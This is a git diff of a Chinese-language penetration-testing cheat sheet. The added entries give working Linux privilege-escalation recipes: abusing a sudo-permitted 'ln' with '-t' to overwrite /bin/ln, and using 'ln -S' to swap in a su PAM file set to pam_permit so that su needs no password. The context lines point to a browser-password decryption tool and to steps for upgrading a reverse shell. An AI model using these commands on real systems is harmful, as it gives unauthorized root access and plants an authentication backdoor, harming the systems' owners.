@@ -326,12 +326,22 @@ find /proc/ 2>/dev/null | grep tcp | grep -v task | grep -v sys/net | xargs grep
 ## 读取浏览器数据，解密密码
 [HackBrowserData](https://github.com/moonD4rk/HackBrowserData)
 
-## `ln -t`使用
+## 利用`ln`提权
+### 利用`ln -t`
 如果sudo配置里面只允许创建符号链接`ln -sf * A`，由于中间有通配，可使用`-t`忽略链接名称A，并覆盖任意文件，从而提权
-```
-root@test:~# ln -sf /tmp/ln -t /bin aaaaaa
-root@test:~# ls /bin/ln -l
+```shell
+ln -sf /tmp/ln -t /bin aaaaaa
+ls /bin/ln -l
 lrwxrwxrwx 1 root root 7 Mar 21 09:06 /bin/ln -> /tmp/ln
+```
+### 利用`ln -S`
+```shell
+cp /etc/pam.d/su /tmp
+sed -i 's/auth.*/auth sufficient pam_permit.so/' /tmp/su
+ln -s /usr/local/xxx/ /tmp/su /etc/pam.d -S xxx
+ls /etc/pam.d/ -l
+lrwxrwxrwx 1 root root    7 Jun 25 17:25 su -> /tmp/su
+lrwxrwxrwx 1 root root   15 Jun 25 17:25 xxx -> /usr/local/xxx/
 ```
 
 ## 利用网络命名空间抓取指定进程流量
@@ -402,6 +412,14 @@ find . -maxdepth 1 -mindepth 1 -name "*.html" -exec sed -i 's/http:\/\/www.a.tes
 - 服务端执行`fg + [Enter x 2]`
 - 服务端执行`script /dev/null && exit`
 - 服务端执行`reset`
+
+## git删除历史文件
+> https://www.cnblogs.com/rptgba/articles/7156074.html
+
+```bash
+git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch ${filename}' --prune-empty --tag-name-filter cat -- --all
+git push --all --force
+```
 
 # 系统
 
